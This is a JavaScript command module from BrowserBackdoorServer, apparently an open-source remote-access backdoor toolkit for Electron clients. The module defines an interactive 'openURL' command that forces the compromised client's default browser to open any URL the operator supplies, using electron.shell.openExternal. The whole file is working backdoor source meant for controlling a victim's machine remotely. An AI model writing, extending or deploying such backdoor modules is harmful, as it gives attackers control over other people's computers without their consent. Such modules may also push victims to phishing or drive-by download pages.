// INTERACTIVE
/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Info: Opens a URL in the client's default browser
 * Parameters: URL
 * Returns: undefined
 * Author: IMcPwn
 */

if (typeof electron === typeof undefined) electron = require('electron');

openURL = function (url) {
    electron.shell.openExternal(url);
}

return "Usage: openURL(url)";
